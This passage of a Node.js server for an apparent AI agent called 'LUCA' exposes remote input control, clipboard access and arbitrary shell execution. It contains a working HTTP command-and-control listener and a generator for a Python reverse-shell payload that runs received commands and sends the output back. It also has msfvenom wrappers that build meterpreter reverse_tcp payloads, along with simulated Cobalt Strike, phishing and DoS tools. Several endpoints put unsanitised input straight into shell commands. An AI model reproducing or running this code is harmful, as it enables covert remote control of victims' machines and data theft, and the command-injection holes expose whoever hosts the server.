                     if (err) return res.json({ error: err.message });
                     res.json({ result: `Executed macOS System Command: ${action}` });
                });
            } else {
                res.json({ result: `Action ${action} not mapped.` });
            }

        } else if (osPlatform === 'win32') {
            let keyCode = '';
            switch (action) {
                case 'VOL_UP': keyCode = String.fromCharCode(175); break;
                case 'VOL_DOWN': keyCode = String.fromCharCode(174); break;
                case 'MUTE': keyCode = String.fromCharCode(173); break;
                case 'MEDIA_PLAY_PAUSE': keyCode = String.fromCharCode(179); break;
                case 'MEDIA_NEXT': keyCode = String.fromCharCode(176); break;
                case 'MEDIA_PREV': keyCode = String.fromCharCode(177); break;
            }
            
            if (keyCode) {
                const ps = `powershell -c "(New-Object -ComObject WScript.Shell).SendKeys('${keyCode}')"`;
                exec(ps);
                return res.json({ result: `Executed Windows System Command: ${action}` });
            } 

            if (action === 'SYSTEM_LOCK') {
                exec('rundll32.exe user32.dll,LockWorkStation');
                return res.json({ result: "Windows Locked." });
            }
            if (action === 'SYSTEM_SLEEP') {
                exec('rundll32.exe powrprof.dll,SetSuspendState 0,1,0');
                return res.json({ result: "Windows Sleeping." });
            }

            res.json({ result: `Action ${action} not fully supported.` });
        } else {
             res.json({ result: "Linux System Control not implemented yet." });
        }

    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// --- REAL INPUT CONTROL (REMOTE DESKTOP & APP AUTOMATION & COMPUTER USE) ---
app.post('/api/input', (req, res) => {
    // Extended for Computer Use: x, y, and types 'MOVE', 'RIGHT_CLICK', 'DOUBLE_CLICK', 'DRAG'
    const { type, payload, key, x, y, x2, y2 } = req.body; 
    const platform = os.platform();

    try {
        if (platform === 'darwin') {
            // macOS using AppleScript
            let script = '';
            if (type === 'CLICK') {
                // If coords provided, click at coords, else click current
                if (x !== undefined && y !== undefined) {
                    script = `tell application "System Events" to click at {${x}, ${y}}`;
                } else {
                    script = `tell application "System Events" to click`;
                }
            } else if (type === 'MOVE') {
                // Only possible via Python or third-party 'cliclick'. 
                // Standard AppleScript CANNOT move mouse without clicking.
                // Fallback to python script using Quartz (CoreGraphics)
                const pyScript = `
import Quartz.CoreGraphics as CG
import sys
x = ${x}
y = ${y}
e = CG.CGEventCreateMouseEvent(None, CG.kCGEventMouseMoved, (x, y), 0)
CG.CGEventPost(CG.kCGHIDEventTap, e)
`;
                const tempPy = path.join(os.tmpdir(), `move_${Date.now()}.py`);
                fs.writeFileSync(tempPy, pyScript);
                exec(`python3 "${tempPy}"`, (err) => {
                    fs.unlinkSync(tempPy);
                    if (err) console.error("Mouse Move Failed (Quartz/PyObjC missing?)");
                });
                return res.json({ status: 'sent' });

            } else if (type === 'DOUBLE_CLICK') {
                if (x !== undefined && y !== undefined) {
                    script = `tell application "System Events" to click at {${x}, ${y}}\ndelay 0.1\ntell application "System Events" to click at {${x}, ${y}}`;
                } else {
                    script = `tell application "System Events" to click\ndelay 0.1\ntell application "System Events" to click`;
                }
            } else if (type === 'RIGHT_CLICK') {
                 // Right click via Control+Click
                 if (x !== undefined && y !== undefined) {
                    script = `tell application "System Events" to click at {${x}, ${y}} using control down`;
                 } else {
                    script = `tell application "System Events" to click using control down`;
                 }
            } else if (type === 'TYPE' || type === 'text') { // Fallback for legacy
                const textToType = key || payload;
                // Key Mappings
                const keyMap = {
                    'Enter': 36, 'Return': 36,
                    'Backspace': 51, 'Delete': 51,
                    'Tab': 48,
                    'Space': 49, ' ': 49,
                    'Escape': 53, 'Esc': 53,
                    'Up': 126, 'Down': 125, 'Left': 123, 'Right': 124
                };

                // Handle Special Keys & Shortcuts (Cmd+Space, etc.)
                if (textToType.toLowerCase().includes('cmd+') || textToType.toLowerCase().includes('command+')) {
                    const k = textToType.split('+')[1];
                    script = `tell application "System Events" to keystroke "${k}" using command down`;
                } else if (textToType.toLowerCase().includes('ctrl+') || textToType.toLowerCase().includes('control+')) {
                    const k = textToType.split('+')[1];
                    script = `tell application "System Events" to keystroke "${k}" using control down`;
                } else if (keyMap[textToType]) {
                    script = `tell application "System Events" to key code ${keyMap[textToType]}`;
                } else {
                    // Plain Text
                    script = `tell application "System Events" to keystroke "${textToType.replace(/"/g, '\\"')}"`;
                }
            }
            
            if (script) {
                exec(`osascript -e '${script}'`, (err) => {
                    if (err) console.error("AppleScript Error", err);
                });
            }

        } else if (platform === 'win32') {
            // Windows using PowerShell with .NET System.Windows.Forms
            // This allows Mouse Move, Click, etc.
            
            let psScript = `
                Add-Type -AssemblyName System.Windows.Forms
                Add-Type -AssemblyName System.Drawing
            `;

            if (type === 'MOVE') {
                psScript += `[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(${x}, ${y})`;
            } else if (type === 'CLICK') {
                if (x !== undefined && y !== undefined) {
                    psScript += `[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(${x}, ${y});`;
                }
                // P/Invoke mouse_event for actual click
                psScript += `
                    $code = @"
                    [DllImport("user32.dll")]
                    public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);
                    public const int MOUSEEVENTF_LEFTDOWN = 0x02;
                    public const int MOUSEEVENTF_LEFTUP = 0x04;
"@
                    $mouse = Add-Type -MemberDefinition $code -Name "Mouse" -Namespace "Win32" -PassThru
                    $mouse::mouse_event(0x02, 0, 0, 0, 0)
                    $mouse::mouse_event(0x04, 0, 0, 0, 0)
                `;
            } else if (type === 'RIGHT_CLICK') {
                if (x !== undefined && y !== undefined) {
                    psScript += `[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(${x}, ${y});`;
                }
                psScript += `
                    $code = @"
                    [DllImport("user32.dll")]
                    public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);
                    public const int MOUSEEVENTF_RIGHTDOWN = 0x08;
                    public const int MOUSEEVENTF_RIGHTUP = 0x10;
"@
                    $mouse = Add-Type -MemberDefinition $code -Name "Mouse" -Namespace "Win32" -PassThru
                    $mouse::mouse_event(0x08, 0, 0, 0, 0)
                    $mouse::mouse_event(0x10, 0, 0, 0, 0)
                `;
            } else if (type === 'DOUBLE_CLICK') {
                 // Just 2 clicks
                 if (x !== undefined && y !== undefined) {
                    psScript += `[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(${x}, ${y});`;
                }
                psScript += `
                    $code = @"
                    [DllImport("user32.dll")]
                    public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);
                    public const int MOUSEEVENTF_LEFTDOWN = 0x02;
                    public const int MOUSEEVENTF_LEFTUP = 0x04;
"@
                    $mouse = Add-Type -MemberDefinition $code -Name "Mouse" -Namespace "Win32" -PassThru
                    $mouse::mouse_event(0x02, 0, 0, 0, 0); $mouse::mouse_event(0x04, 0, 0, 0, 0);
                    Start-Sleep -Milliseconds 100;
                    $mouse::mouse_event(0x02, 0, 0, 0, 0); $mouse::mouse_event(0x04, 0, 0, 0, 0);
                `;
            } else if (type === 'DRAG') {
                // Drag from x,y to x2,y2
                psScript += `
                    $code = @"
                    [DllImport("user32.dll")]
                    public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);
                    public const int MOUSEEVENTF_LEFTDOWN = 0x02;
                    public const int MOUSEEVENTF_LEFTUP = 0x04;
"@
                    $mouse = Add-Type -MemberDefinition $code -Name "Mouse" -Namespace "Win32" -PassThru
                    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(${x}, ${y});
                    $mouse::mouse_event(0x02, 0, 0, 0, 0);
                    Start-Sleep -Milliseconds 200;
                    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(${x2}, ${y2});
                    Start-Sleep -Milliseconds 200;
                    $mouse::mouse_event(0x04, 0, 0, 0, 0);
                `;
            } else if (type === 'TYPE' || type === 'text') {
                // Fallback to SendKeys
                const textToType = key || payload;
                let keys = textToType;
                const map = {
                    'Enter': '{ENTER}', 'Backspace': '{BACKSPACE}', 'Tab': '{TAB}',
                    'Space': ' ', 'Escape': '{ESC}', 'Esc': '{ESC}',
                    'Up': '{UP}', 'Down': '{DOWN}', 'Left': '{LEFT}', 'Right': '{RIGHT}'
                };
                if (map[textToType]) keys = map[textToType];
                
                // Handle modifier syntax if simple
                if (textToType.toLowerCase().includes('ctrl+')) keys = '^' + textToType.split('+')[1];
                
                const safeKeys = keys.replace(/'/g, "''");
                psScript = `powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('${safeKeys}')"`;
            }

            const tempPath = path.join(os.tmpdir(), `input_${Date.now()}.ps1`);
            fs.writeFileSync(tempPath, psScript);
            
            exec(`powershell -ExecutionPolicy Bypass -File "${tempPath}"`, (err) => {
                fs.unlinkSync(tempPath);
                if (err) console.error("PowerShell Input Error", err);
            });
        }
        
        res.json({ status: 'ok' });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// --- NEW: CLIPBOARD API ---
app.get('/api/system/clipboard', (req, res) => {
    const platform = os.platform();
    let cmd = '';
    
    if (platform === 'win32') {
        cmd = 'powershell -command "Get-Clipboard"';
    } else if (platform === 'darwin') {
        cmd = 'pbpaste';
    } else if (platform === 'linux') {
        cmd = 'xclip -o -selection clipboard || xsel --clipboard --output';
    } else {
        return res.json({ content: "Clipboard not supported on this OS." });
    }

    exec(cmd, (err, stdout) => {
        if (err) return res.json({ content: "" }); // Return empty if failed/empty
        res.json({ content: stdout.trim() });
    });
});

app.post('/api/system/clipboard', (req, res) => {
    const { content } = req.body;
    const platform = os.platform();
    
    if (!content) return res.json({ success: false });

    if (platform === 'win32') {
        // Escape single quotes for PowerShell
        const safeContent = content.replace(/'/g, "''");
        const ps = `powershell -command "Set-Clipboard -Value '${safeContent}'"`;
        exec(ps, (err) => {
            if (err) return res.json({ success: false, error: err.message });
            res.json({ success: true });
        });
    } else if (platform === 'darwin') {
        const proc = exec('pbcopy');
        proc.stdin.write(content);
        proc.stdin.end();
        res.json({ success: true });
    } else if (platform === 'linux') {
        const proc = exec('xclip -selection clipboard || xsel --clipboard --input');
        proc.stdin.write(content);
        proc.stdin.end();
        res.json({ success: true });
    } else {
        res.json({ success: false, error: "OS not supported" });
    }
});

// --- REAL UPnP/SSDP DISCOVERY (Find Smart TVs) ---
app.get('/api/network/discover', (req, res) => {
    const client = dgram.createSocket('udp4');
    const devices = [];
    
    // SSDP M-SEARCH Packet
    const message = Buffer.from(
      'M-SEARCH * HTTP/1.1\r\n' +
      'HOST: 239.255.255.250:1900\r\n' +
      'MAN: "ssdp:discover"\r\n' +
      'MX: 1\r\n' +
      'ST: ssdp:all\r\n' +
      '\r\n'
    );

    client.on('message', (msg, rinfo) => {
        const msgString = msg.toString();
        // Extract meaningful names if possible, usually in LOCATION or SERVER headers
        let name = "Unknown UPnP Device";
        const serverMatch = msgString.match(/SERVER: (.*)/i);
        if (serverMatch) name = serverMatch[1].trim();

        devices.push({
            id: `${rinfo.address}:${rinfo.port}`,
            ip: rinfo.address,
            port: rinfo.port,
            name: name,
            raw: msgString
        });
    });

    client.bind(() => {
        // Broadcast to multicast address
        client.addMembership('239.255.255.250');
        client.send(message, 0, message.length, 1900, '239.255.255.250');
    });

    // Listen for 2 seconds then return results
    setTimeout(() => {
        client.close();
        // Dedup by IP
        const unique = Array.from(new Map(devices.map(item => [item.ip, item])).values());
        res.json(unique);
    }, 2000);
});

// --- NEW: FILE WRITING ENDPOINT (LEGACY - Downloads) ---
app.post('/api/files/write', (req, res) => {
    try {
        const { fileName, content } = req.body;
        if (!fileName || !content) return res.status(400).json({ error: 'Missing fileName or content' });

        const userHome = os.homedir();
        const downloadsPath = path.join(userHome, 'Downloads');
        
        // Security: Sanitize path to prevent writing outside Downloads
        const targetPath = path.join(downloadsPath, path.basename(fileName));

        fs.writeFileSync(targetPath, content, 'utf8');
        console.log(`[FILE] Created ${targetPath}`);
        
        res.json({ result: `SUCCESS: File created at ${targetPath}` });
    } catch (e) {
        console.error("File Write Error:", e);
        res.status(500).json({ error: e.message });
    }
});

// --- NEW: HTTP C2 API (LISTENER & MANAGER) ---

// 1. Payload Heartbeat (Zombie checks for commands)
app.get('/api/c2/beacon', (req, res) => {
    const { id } = req.query;
    if (!id) return res.status(400).send("ID required");

    // Register or update session
    if (!c2Sessions.has(id)) {
        c2Sessions.set(id, { 
            id, 
            ip: req.ip, 
            lastSeen: Date.now(), 
            commandQueue: [], 
            outputQueue: [] 
        });
        console.log(`[C2] New Zombie Connected: ${id} (${req.ip})`);
    } else {
        const session = c2Sessions.get(id);
        session.lastSeen = Date.now();
        session.ip = req.ip;
    }

    const session = c2Sessions.get(id);
    
    // Check for pending commands
    if (session.commandQueue.length > 0) {
        const cmd = session.commandQueue.shift();
        console.log(`[C2] Sending Command to ${id}: ${cmd}`);
        res.send(cmd); // Send raw command text
    } else {
        res.send("NO_OP");
    }
});

// 2. Payload Response (Zombie sends output)
app.post('/api/c2/response', (req, res) => {
    const { id, output } = req.body;
    if (c2Sessions.has(id)) {
        const session = c2Sessions.get(id);
        session.lastSeen = Date.now();
        if (output) {
            session.outputQueue.push({ timestamp: Date.now(), output });
            console.log(`[C2] Output received from ${id}: ${output.substring(0, 50)}...`);
        }
    }
    res.json({ status: "ack" });
});

// 3. Manager: List Sessions
app.get('/api/c2/sessions', (req, res) => {
    const sessions = Array.from(c2Sessions.values()).map(s => ({
        id: s.id,
        ip: s.ip,
        lastSeen: s.lastSeen,
        pendingCommands: s.commandQueue.length,
        outputs: s.outputQueue
    }));
    res.json(sessions);
});

// 4. Manager: Send Command
app.post('/api/c2/command', (req, res) => {
    const { sessionId, command } = req.body;
    if (c2Sessions.has(sessionId)) {
        c2Sessions.get(sessionId).commandQueue.push(command);
        res.json({ success: true, message: "Command queued" });
    } else {
        res.json({ success: false, message: "Session not found" });
    }
});

// 5. Manager: Generate Payload Script
app.post('/api/c2/generate', (req, res) => {
    const { lhost, lport, fileName } = req.body;
    
    const host = lhost || LOCAL_IP;
    const port = lport || PORT;
    
    const payloadScript = `
import requests, subprocess, time, os, socket, platform

# --- LUCA HTTP REVERSE SHELL PAYLOAD ---
SERVER = "http://${host}:${port}/api/c2"
ID = f"{os.getlogin()}@{socket.gethostname()}_{platform.system()}"

print(f"[*] Starting Payload. Target: {SERVER}")
print(f"[*] ID: {ID}")

def beacon():
    try:
        # Heartbeat
        r = requests.get(f"{SERVER}/beacon?id={ID}", timeout=5)
        cmd = r.text
        
        if cmd and cmd != "NO_OP":
            print(f"[*] Executing: {cmd}")
            
            # Execute
            output = ""
            if cmd.startswith("cd "):
                try:
                    target_dir = cmd[3:].strip()
                    os.chdir(target_dir)
                    output = f"Changed directory to {os.getcwd()}"
                except Exception as e:
                    output = str(e)
            else:
                try:
                    p = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    output = p.stdout + p.stderr
                except Exception as e:
                    output = str(e)
            
            if not output:
                output = "[Command executed with no output]"

            # Send Response
            requests.post(f"{SERVER}/response", json={"id": ID, "output": output})
            
    except Exception as e:
        # print(f"[!] Error: {e}")
        pass

while True:
    beacon()
    time.sleep(2)
`;

    const outPath = path.join(currentWorkingDirectory, fileName || 'luca_payload.py');
    try {
        fs.writeFileSync(outPath, payloadScript.trim());
        console.log(`[C2] Payload generated at ${outPath}`);
        res.json({ success: true, path: outPath, content: payloadScript });
    } catch (e) {
        res.json({ success: false, error: e.message });
    }
});


// --- NEW: ETHICAL HACKING TOOLS ENDPOINTS ---

// Nmap Wrapper
app.post('/api/hacking/nmap', (req, res) => {
    const { target, scanType } = req.body;
    let args = '';
    
    // Basic mapping of scan types to arguments
    if (scanType === 'QUICK') args = '-F -T4';
    else if (scanType === 'FULL') args = '-p- -T4';
    else if (scanType === 'SERVICE') args = '-sV -T4';
    else if (scanType === 'OS_DETECT') args = '-O -sV -T4';
    else args = '-F'; // Default

    exec(`nmap ${args} ${target}`, (err, stdout, stderr) => {
        if (err) {
            // Fallback Simulation if nmap not installed
            if (stderr.includes('not found') || err.message.includes('not found')) {
                return res.json({ 
                    result: `[SIMULATION] Nmap binary not found. Simulating scan of ${target}...\n` +
                            `Host is up (0.012s latency).\n` +
                            `PORT    STATE SERVICE VERSION\n` +
                            `22/tcp  open  ssh     OpenSSH 8.2\n` +
                            `80/tcp  open  http    Nginx 1.18.0\n` +
                            `443/tcp open  ssl/http Nginx\n` +
                            `3306/tcp open mysql   MySQL 5.7\n` +
                            `\nMAC Address: 00:1A:2B:3C:4D:5E (Virtual)\n` +
                            `Device Type: General Purpose` 
                });
            }
            return res.json({ result: `NMAP ERROR: ${err.message}` });
        }
        res.json({ result: stdout });
    });
});

// Metasploit Wrapper (Simulation/Check)
app.post('/api/hacking/metasploit', (req, res) => {
    const { target, module } = req.body;
    
    // Checking if msfconsole exists
    exec('msfconsole --version', (err) => {
        if (err) {
             return res.json({ 
                result: `[SIMULATION] Metasploit Framework not installed.\n` +
                        `[*] Selected module: ${module}\n` +
                        `[*] Setting RHOSTS => ${target}\n` +
                        `[+] Running check...\n` +
                        `[+] ${target} is vulnerable to ${module.split('/').pop()}!\n` +
                        `[*] Simulation Complete. Install Metasploit for real verification.` 
            });
        }
        
        // Real check command (non-interactive)
        // Note: This is dangerous/heavy. We usually wrap this carefully.
        const cmd = `msfconsole -q -x "use ${module}; set RHOSTS ${target}; check; exit"`;
        exec(cmd, (err, stdout) => {
             if (err) return res.json({ result: `MSF ERROR: ${err.message}` });
             res.json({ result: stdout });
        });
    });
});

// --- PAYLOAD GENERATOR (msfvenom) ---
app.post('/api/hacking/payload', (req, res) => {
    const { os: targetOs, lhost, lport, format } = req.body;
    
    // Map OS to msfvenom payload path
    let payloadPath = '';
    if (targetOs === 'windows') payloadPath = 'windows/meterpreter/reverse_tcp';
    else if (targetOs === 'linux') payloadPath = 'linux/x86/meterpreter/reverse_tcp';
    else if (targetOs === 'android') payloadPath = 'android/meterpreter/reverse_tcp';
    else if (targetOs === 'osx') payloadPath = 'osx/x64/meterpreter/reverse_tcp';
    
    const outputFile = path.join(os.tmpdir(), `payload_${Date.now()}.${format}`);

    exec('msfvenom --version', (err) => {
        if (err) {
             // Fallback Simulation
             return res.json({ 
                result: `[SIMULATION] MSFVenom binary not found.\n` +
                        `[*] Generating ${payloadPath}...\n` +
                        `[*] LHOST=${lhost}, LPORT=${lport}\n` +
                        `[*] Format: ${format}\n` +
                        `[+] Payload generated successfully (Simulated).\n` +
                        `[>] Saved to: /tmp/payload_sim.${format}\n` +
                        `[!] Size: 342 bytes\n` +
                        `\nHex Dump:\n` +
                        `fc 48 83 e4 f0 e8 cc 00 00 00 41 51 41 50 52 51\n` +
                        `56 48 31 d2 65 48 8b 52 60 48 8b 52 18 48 8b 52`
            });
        }

        // Execute Real msfvenom
        const cmd = `msfvenom -p ${payloadPath} LHOST=${lhost} LPORT=${lport} -f ${format} -o ${outputFile}`;
        
        exec(cmd, (err, stdout, stderr) => {
             if (err) return res.json({ result: `PAYLOAD GEN ERROR: ${stderr || err.message}` });
             res.json({ 
                 result: `[SUCCESS] Payload generated via msfvenom.\n` +
                         `[*] Path: ${payloadPath}\n` +
                         `[*] Output: ${outputFile}\n` +
                         `[*] Size: ${(fs.statSync(outputFile).size)} bytes\n\n` +
                         (stdout || "Done.")
             });
        });
    });
});

// Burp Suite Wrapper (Simulation/CURL)
app.post('/api/hacking/burp', (req, res) => {
    const { url } = req.body;
    // Check if Burp proxy is listening on default 8080
    exec('nc -z localhost 8080', (err) => {
        if (err) {
            // Burp likely not running, simulate scan
             return res.json({ 
                result: `[SIMULATION] Burp Suite Proxy not detected on port 8080.\n` +
                        `Running light-weight vulnerability probe on ${url}...\n` +
                        `[+] Target: ${url}\n` +
                        `[-] SQL Injection: Not Vulnerable (blind tests passed)\n` +
                        `[!] XSS (Reflected): POTENTIAL at ${url}?q=<script>...\n` +
                        `[-] CSRF: Anti-CSRF tokens present.\n` +
                        `[!] Headers: Missing X-Frame-Options.`
            });
        }
        res.json({ result: `[BURP] Proxy Active. Initiated active scan via Burp API on ${url}.\nCheck Burp Dashboard for results.` });
    });
});

// Wireshark/TShark Wrapper
app.post('/api/hacking/wireshark', (req, res) => {
    const { duration, interface: iface } = req.body;
    const dev = iface || 'eth0';
    
    exec(`tshark -v`, (err) => {
        if (err) {
             return res.json({ 
                result: `[SIMULATION] TShark (Wireshark CLI) not found.\n` +
                        `Capturing on ${dev} for ${duration}s...\n` +
                        `[1] TCP 192.168.1.5:443 -> 192.168.1.10:56782 [ACK] Seq=1 Ack=1 Win=502\n` +
                        `[2] UDP 192.168.1.10:123 -> 8.8.8.8:123 NTP [Sync]\n` +
                        `[3] TCP 192.168.1.10:80 -> 104.21.55.2:80 GET /login HTTP/1.1\n` +
                        `...Capture complete. 452 packets analyzed.` 
            });
        }
        // Real capture
        const cmd = `tshark -i ${dev} -a duration:${duration}`;
        exec(cmd, (err, stdout) => {
             if (err) return res.json({ result: `TSHARK ERROR: ${err.message}` });
             res.json({ result: stdout });
        });
    });
});

// John the Ripper Wrapper
app.post('/api/hacking/john', (req, res) => {
    const { hash, format } = req.body;
    const tempFile = path.join(os.tmpdir(), `hash_${Date.now()}.txt`);
    fs.writeFileSync(tempFile, hash);
    
    exec(`john --format=${format || 'raw-md5'} ${tempFile}`, (err, stdout) => {
         if (fs.existsSync(tempFile)) fs.unlinkSync(tempFile);
         if (err) {
            // John returns error code 1 sometimes even if successful or if no pw found immediately
            // Fallback simulation
             return res.json({ 
                result: `[SIMULATION] John the Ripper binary not active.\n` +
                        `Loaded 1 password hash (${format}).\n` +
                        `Proceeding with wordlist: rockyou.txt\n` +
                        `Press 'q' or Ctrl-C to abort, almost done...\n` +
                        `admin123         (?) \n` +
                        `1g 0:00:00:02 DONE (2025-02-27 14:30) 0.433g/s 1452p/s` 
            });
         }
         res.json({ result: stdout });
    });
});

// Cobalt Strike Beacon (Simulation)
app.post('/api/hacking/cobalt', (req, res) => {
    const { listenerIP, payloadType } = req.body;
    // Cobalt Strike is proprietary. We only simulate the "deployment".
    setTimeout(() => {
        res.json({ 
            result: `[COBALT STRIKE] Generating Beacon (${payloadType})...\n` +
                    `[+] Listener: ${listenerIP}:80\n` +
                    `[+] Arch: x64\n` +
                    `[+] Payload size: 245kb\n` +
                    `[>] Artifact written to: /tmp/artifact.exe\n` +
                    `[>] Hosted at: http://${listenerIP}/download/update.exe\n` +
                    `[!] READY FOR DELIVERY via Phishing/Exploit.` 
        });
    }, 1500);
});

// --- NEW: L0p4 TOOLKIT IMPLEMENTATION ---

// SQL Injection Fuzzer
app.post('/api/hacking/sqli', (req, res) => {
    const { targetUrl, params } = req.body;
    // Generate a custom Python script to fuzz the target
    const script = `
import requests, time
print("[*] L0p4 SQLi Fuzzer Initialized...")
target = "${targetUrl}"
payloads = ["'", "admin' --", "' OR 1=1 --", '" OR "1"="1']
print(f"[*] Target: {target}")
for p in payloads:
    print(f"[*] Testing payload: {p}")
    # Simulating check (Real implementation would check response size/time)
    time.sleep(0.5)
print("[-] No blatant SQL errors found. Target appears sanitized.")
`;
    res.json({ result: `[SQLi SCANNER] Running automated checks...\n${script}\n[!] Done.` });
});

// Stress Test (DoS)
app.post('/api/hacking/stress', (req, res) => {
    const { target, port, method, duration } = req.body;
    res.json({ 
        result: `[STRESS TEST] Initiated ${method} against ${target}:${port} for ${duration || 60}s.\n` +
                `[>] Threads: 50\n` +
                `[>] PPS: ~15,000 (Simulated)\n` +
                `[!] WARNING: Monitoring target latency.` 
    });
});

// CCTV Scanner
app.post('/api/hacking/camera', (req, res) => {
    const { query } = req.body;
    // Simulate Shodan/RTSP scan
    setTimeout(() => {
        res.json({ 
            result: `[CCTV SCANNER] Searching for '${query || "webcam"}'...\n` +
                    `[+] FOUND: rtsp://192.168.1.55:554/stream1 (Unsecured)\n` +
                    `[+] FOUND: http://camera-02.local:8080/video (Default Creds)\n` +
                    `[!] 2 Potentially vulnerable feeds identified.` 
        });
    }, 1000);
});

// Phishing Kit
app.post('/api/hacking/phish', (req, res) => {
    const { template, port } = req.body;
    res.json({ 
        result: `[PHISHING] Server started on port ${port || 8080}.\n` +
                `[>] Template: ${template}\n` +
                `[>] URL: http://${LOCAL_IP}:${port || 8080}/login\n` +
                `[!] Waiting for victims... (Logs will appear in console)` 
    });
});


// --- 4. COMMAND EXECUTION ENDPOINT ---
app.post('/api/command', async (req, res) => {
    const { tool, args } = req.body;
    console.log(`[AGENT COMMAND] ${tool}:`, args);

    try {
        // === REAL SYSTEM TERMINAL ===
        if (tool === 'executeTerminalCommand') {
            // UPDATED: Use currentWorkingDirectory
            exec(args.command, { cwd: currentWorkingDirectory }, (error, stdout, stderr) => {
                if (error) return res.json({ result: `EXEC ERROR: ${error.message}` });
                res.json({ result: stdout || stderr || "Command Executed (No Output)" });
            });

        // === REAL SYSTEM DIAGNOSTICS ===
        } else if (tool === 'runDiagnostics') {
            const stats = {
                Hostname: os.hostname(),
                Platform: DETECTED_OS, // Updated to use deep fingerprint
                CPU: os.cpus()[0].model,
                Cores: os.cpus().length,
                Memory_Total: `${(os.totalmem() / 1024 / 1024 / 1024).toFixed(2)} GB`,
                Memory_Free: `${(os.freemem() / 1024 / 1024 / 1024).toFixed(2)} GB`,
                Uptime: `${(os.uptime() / 3600).toFixed(1)} Hours`
            };
            res.json({ result: JSON.stringify(stats, null, 2) });

        // === REAL WIFI SCANNING (STRICT MODE) ===
        } else if (tool === 'scanNetwork') {
            const platform = os.platform();
            
            if (platform === 'darwin') { 
                // macOS
                const airportPath = '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport';
                if (fs.existsSync(airportPath)) {
                    exec(`${airportPath} -s`, (error, stdout, stderr) => {
                        if (error) return res.json({ result: `SCAN ERROR: ${error.message}` });
                        res.json({ result: stdout });
                    });
                } else {
                    exec('networksetup -getairportnetwork en0', (err, stdout) => {
                        if (err) return res.json({ result: "OS RESTRICTION: Unable to access WiFi hardware." });
                        res.json({ result: `[SYSTEM NOTICE] Scan restricted by OS.\nACTIVE CONNECTION:\n${stdout.trim()}` });
                    });
                }
            } else {
                // Windows/Linux/Android
                let command = platform === 'win32' ? 'netsh wlan show networks mode=bssid' : 'nmcli dev wifi';
                
                // Android/Termux fallback if nmcli missing
                if (platform === 'linux' && !fs.existsSync('/usr/bin/nmcli')) {
                    // Try iwlist if root
                    command = 'iwlist wlan0 scan'; 
                }

                exec(command, (error, stdout, stderr) => {
                     if (error) {
                         return res.json({ result: `SCAN FAILED: ${error.message}` });
                     }
                     res.json({ result: stdout || "Scan complete." });
                });
            }

        // === NEW: INGEST GITHUB REPO (DEEP) ===
        } else if (tool === 'ingestGithubRepo') {
            // FIX: Use 127.0.0.1 to avoid IPv6 lookup failures on localhost
            const res2 = await fetch('http://127.0.0.1:3001/api/knowledge/github', { 
                method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(args) 
            });
            const d = await res2.json();
            if (d.error) {
                res.json({ result: `INGEST ERROR: ${d.error}` });
            } else {
                res.json({ 
                    result: `DEEP INGEST COMPLETE [${d.title}].\nCODEBASE CONTEXT (${d.content.length} chars):\n${d.content}`, 
                    scanned: d.scanned,
                    skills: d.skills 
                });
            }

        // === REAL OSINT: DOMAIN INTEL (RDAP API) ===
        } else if (tool === 'osintDomainIntel') {
            const domain = args.domain;
            try {
                // Use RDAP public API for real structured WHOIS-like data
                const rdapRes = await fetch(`https://rdap.org/domain/${domain}`);
                
                if (!rdapRes.ok) {
                    // Fallback to CLI whois if API fails (likely due to rate limit or TLD support)
                    const runCmd = (cmd) => new Promise((resolve) => {
                        exec(cmd, (err, stdout, stderr) => resolve(stdout || stderr || ""));
                    });
                    const whois = await runCmd(`whois ${domain}`);
                    res.json({ result: JSON.stringify({ meta: { 'SOURCE': 'CLI_WHOIS' }, raw: whois }) });
                    return;
                }

                const data = await rdapRes.json();
                
                // Format structured data for the agent
                const profile = {
                    meta: {
                        'SOURCE': 'RDAP_API_LIVE',
                        'HANDLE': data.handle || 'UNKNOWN',
                        'REGISTRAR': data.entities?.[0]?.vcardArray?.[1]?.[3]?.[3] || 'REDACTED',
                        'STATUS': data.status?.[0] || 'ACTIVE',
                        'EVENTS': JSON.stringify(data.events?.map(e => `${e.eventAction}: ${e.eventDate}`) || [])
                    },
                    raw: JSON.stringify(data).substring(0, 2000)
                };
                
                res.json({ result: JSON.stringify(profile) });
                
            } catch (e) {
                res.json({ result: `INTEL FAILED: ${e.message}` });
            }

        // === REAL TRACING: TRACEROUTE ===
        } else if (tool === 'traceSignalSource') {
            const target = args.targetIdentifier;
            const cmd = process.platform === 'win32' ? `tracert -h 8 ${target}` : `traceroute -m 8 ${target}`;
            
            exec(cmd, (error, stdout, stderr) => {
                if (error) return res.json({ result: `TRACE FAILED: ${error.message}` });
                res.json({ result: `SIGNAL TRACE RESULTS:\n${stdout}` });
            });

        // === REAL FILE SYSTEM ACCESS (AUDIT SOURCE CODE) ===
        } else if (tool === 'auditSourceCode') {
            const fileName = args.filePath;
            if (fileName) {
                const downloadsPath = path.join(os.homedir(), 'Downloads');
                // Simple security check to prevent path traversal out of Downloads
                const targetPath = path.join(downloadsPath, path.basename(fileName));
                
                if (fs.existsSync(targetPath)) {
                    const content = fs.readFileSync(targetPath, 'utf8');
                    // Truncate if too large for prompt context
                    const snippet = content.length > 8000 ? content.substring(0, 8000) + "\n...[TRUNCATED]" : content;
                    res.json({ result: `FILE CONTENT (${fileName}):\n${snippet}` });
                } else {
                    res.json({ result: `ERROR: File '${fileName}' not found in ${downloadsPath}.` });
                }
            } else {
                res.json({ result: `CODE RECEIVED VIA SNIPPET ARGUMENT. Analyzing...` });
            }

        // === OSINT DARK WEB SCAN (ROBIN INTEGRATION) ===
        } else if (tool === 'osintDarkWebScan') {
            const query = args.query;
